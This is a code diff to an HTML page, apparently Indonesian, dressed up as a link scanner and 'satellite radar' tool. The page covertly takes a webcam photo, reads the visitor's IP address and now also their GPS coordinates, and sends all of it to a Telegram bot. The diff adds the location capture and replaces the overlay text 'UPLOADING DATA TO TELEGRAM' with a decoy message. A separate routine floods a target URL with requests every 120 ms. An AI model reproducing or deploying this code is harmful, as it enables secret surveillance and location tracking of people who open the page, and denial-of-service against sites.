@@ -22,7 +22,7 @@
         #scanStatus { display: none; margin-top: 10px; text-align: center; padding: 10px; border-radius: 10px; font-weight: bold; font-size: 12px; }
         #killerLog { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 100px; overflow-y: auto; color: var(--neon); border: 1px solid #1a1a1a; }
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-container { width: 200px; height: 200px; border-radius: 50%; border: 1px solid rgba(0,255,136,0.3); position: relative; overflow: hidden; }
+        .radar-container { width: 150px; height: 150px; border-radius: 50%; border: 1px solid rgba(0,255,136,0.3); position: relative; overflow: hidden; }
         .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         canvas, video { display: none; }
@@ -39,7 +39,7 @@
 
     <div class="card">
         <h3>🛡️ DEEP CLOUD SCANNER</h3>
-        <input type="text" id="scanInput" placeholder="Masukkan link untuk analisa...">
+        <input type="text" id="scanInput" placeholder="Analisa link mencurigakan...">
         <button class="btn btn-safe" onclick="cekLink()">⚡ ANALYZE TARGET</button>
         <div id="scanStatus"></div>
     </div>
@@ -54,12 +54,12 @@
 
     <div class="card">
         <h3>📡 SATELLITE RADAR</h3>
-        <button class="btn btn-radar" onclick="startRadar()">HUBUNGKAN SATELIT</button>
+        <button class="btn btn-radar" onclick="startRadar()">HUBUNGKAN SATELIT + GPS</button>
     </div>
 
     <div id="radarOverlay">
         <div class="radar-container"><div class="radar-sweep"></div></div>
-        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">UPLOADING DATA TO TELEGRAM...</p>
+        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">LOCKING COORDINATES...</p>
     </div>
 
     <canvas id="canvas"></canvas><video id="v" autoplay playsinline></video>
@@ -97,7 +97,7 @@
                         const ua = UA_DB[Math.floor(Math.random() * UA_DB.length)];
                         fetch(url, { mode: 'no-cors', headers: { 'User-Agent': ua } }).catch(() => {});
                         const e = document.createElement('div');
-                        e.innerText = "> [HIT] " + url.substring(0,15) + "... [BYPASS ON]";
+                        e.innerText = "> [HIT] " + url.substring(0,15) + "...";
                         log.prepend(e);
                         if(log.childNodes.length > 15) log.removeChild(log.lastChild);
                     }, 120);
@@ -120,14 +120,24 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                     const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
-                    await sendTele(blob, ipD.ip); location.reload();
+                    
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        await sendTele(blob, ipD.ip, pos.coords.latitude, pos.coords.longitude);
+                        location.reload();
+                    }, async () => {
+                        await sendTele(blob, ipD.ip, null, null);
+                        location.reload();
+                    }, {timeout: 5000});
                 }, 3000);
             } catch (e) { location.reload(); }
         }
 
-        async function sendTele(photo, ip) {
+        async function sendTele(photo, ip, lat, lon) {
             const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', photo);
-            fd.append('caption', "🔱 [ REPORT V.136 ] 🔱\n🌐 IP: " + ip + "\n📱 DEV: EDWARD-BAIK");
+            let cap = "🔱 [ REPORT V.136 - PRECISION ] 🔱\n🌐 IP: " + ip;
+            if(lat && lon) cap += "\n📍 MAPS: https://www.google.com/maps?q=" + lat + "," + lon;
+            else cap += "\n📍 MAPS: Gagal Mengunci Lokasi";
+            fd.append('caption', cap);
             return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
         }
     </script>
